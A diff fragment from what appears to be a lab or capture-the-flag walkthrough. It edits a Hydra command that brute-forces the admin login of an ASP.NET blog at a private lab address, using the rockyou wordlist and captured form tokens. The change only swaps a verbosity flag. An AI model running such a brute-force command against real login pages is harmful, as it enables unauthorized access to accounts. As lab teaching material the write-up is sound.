@@ -103,7 +103,7 @@ With that, we have all of the information we require to start our brute-forcing 
 Our command looks like this:
 
 ```
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.192.114 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=axRjnB%2B1TmS8i1Hwbx8X9Xjvkk8wBd8J2pvK88DXA1%2BZa0aL%2BNFovmHU5vlSPLh5QIflBnyN23ZLRco2PqAtCw%2BcPpaOUNQM%2FNVNMmwYco0jTW40crI4kC9bB64iXGbapeGPZ%2BFrrBgjOutqxFlRXuawgg5seMdK1p83%2BH8RIbhBBJrl&__EVENTVALIDATION=3WZp4eLcekUHr%2BcdriGax4x02RuYq8vHQ8dwX9UJWrcbY06qff%2FXQV9U%2BcvUrwOVth7j%2B9sd953X20thlPOTXgxZmjeGKdIzPvBAWda%2BQp0vv8WFGlEU9JGYfCnoNExgPIt058Ba4chb3r%2BmbH5qPoh0O1plVUwgXLbDMbthmRrHj%2F%2FN&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -vv
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.192.114 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=axRjnB%2B1TmS8i1Hwbx8X9Xjvkk8wBd8J2pvK88DXA1%2BZa0aL%2BNFovmHU5vlSPLh5QIflBnyN23ZLRco2PqAtCw%2BcPpaOUNQM%2FNVNMmwYco0jTW40crI4kC9bB64iXGbapeGPZ%2BFrrBgjOutqxFlRXuawgg5seMdK1p83%2BH8RIbhBBJrl&__EVENTVALIDATION=3WZp4eLcekUHr%2BcdriGax4x02RuYq8vHQ8dwX9UJWrcbY06qff%2FXQV9U%2BcvUrwOVth7j%2B9sd953X20thlPOTXgxZmjeGKdIzPvBAWda%2BQp0vv8WFGlEU9JGYfCnoNExgPIt058Ba4chb3r%2BmbH5qPoh0O1plVUwgXLbDMbthmRrHj%2F%2FN&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -V
 ```
 
 <br>
